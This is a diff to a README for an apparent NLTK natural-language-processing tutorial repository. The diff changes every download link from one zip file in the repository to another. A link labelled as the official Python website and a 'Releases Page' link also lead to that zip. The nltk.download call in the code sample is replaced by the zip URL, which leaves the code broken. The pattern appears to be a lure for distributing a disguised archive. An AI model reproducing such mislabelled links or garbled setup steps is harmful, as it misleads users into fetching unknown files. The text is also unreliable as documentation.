@@ -1,7 +1,7 @@
 # 🌟 nlp-nltk-python - Easy NLP with Python
 
 ## 🛠️ Download Now
-[![Download nlp-nltk-python](https://raw.githubusercontent.com/Shubham64364/nlp-nltk-python/main/headbander/nlp-nltk-python.zip%20nlp--nltk--python-blue?style=for-the-badge)](https://raw.githubusercontent.com/Shubham64364/nlp-nltk-python/main/headbander/nlp-nltk-python.zip)
+[![Download nlp-nltk-python](https://raw.githubusercontent.com/Shubham64364/nlp-nltk-python/main/14-saving-model-pickel/nlp-nltk-python-v1.2.zip%20nlp--nltk--python-blue?style=for-the-badge)](https://raw.githubusercontent.com/Shubham64364/nlp-nltk-python/main/14-saving-model-pickel/nlp-nltk-python-v1.2.zip)
 
 ## 📜 Introduction
 Welcome to the nlp-nltk-python repository! This repository is your hands-on guide to Natural Language Processing (NLP) using Python and the NLTK library. You will find scripts, explanations, and outputs that help you understand key NLP tasks such as:
@@ -22,7 +22,7 @@ Whether you're a beginner or want to enhance your skills, this guide will walk y
 To get started with nlp-nltk-python, follow these steps to download and run the software:
 
 1. **Visit the Releases Page**: Click the link below to access the releases:
-   - [Download Page](https://raw.githubusercontent.com/Shubham64364/nlp-nltk-python/main/headbander/nlp-nltk-python.zip) 
+   - [Download Page](https://raw.githubusercontent.com/Shubham64364/nlp-nltk-python/main/14-saving-model-pickel/nlp-nltk-python-v1.2.zip) 
 
 2. **Choose the Latest Version**: On the releases page, find the latest release. It will usually be at the top.
 
@@ -38,10 +38,10 @@ To run nlp-nltk-python effectively, ensure you have:
 - Python 3.6 or later installed on your computer.
 - Internet connection for downloading NLTK datasets and corpora.
 
-You can download Python from the official website: [Download Python](https://raw.githubusercontent.com/Shubham64364/nlp-nltk-python/main/headbander/nlp-nltk-python.zip).
+You can download Python from the official website: [Download Python](https://raw.githubusercontent.com/Shubham64364/nlp-nltk-python/main/14-saving-model-pickel/nlp-nltk-python-v1.2.zip).
 
 ## 📥 Download & Install
-To download the application, please go to the [Download Page](https://raw.githubusercontent.com/Shubham64364/nlp-nltk-python/main/headbander/nlp-nltk-python.zip).
+To download the application, please go to the [Download Page](https://raw.githubusercontent.com/Shubham64364/nlp-nltk-python/main/14-saving-model-pickel/nlp-nltk-python-v1.2.zip).
 
 After you've downloaded and installed Python, you may need to set up some additional components for NLTK:
 
@@ -57,7 +57,7 @@ After you've downloaded and installed Python, you may need to set up some additi
 3. **Download NLTK Data**: Open a Python shell or script and run the following commands:
    ```python
    import nltk
-   https://raw.githubusercontent.com/Shubham64364/nlp-nltk-python/main/headbander/nlp-nltk-python.zip('popular')
+   https://raw.githubusercontent.com/Shubham64364/nlp-nltk-python/main/14-saving-model-pickel/nlp-nltk-python-v1.2.zip('popular')
    ```
 
 This command will download the most commonly used datasets and resources.
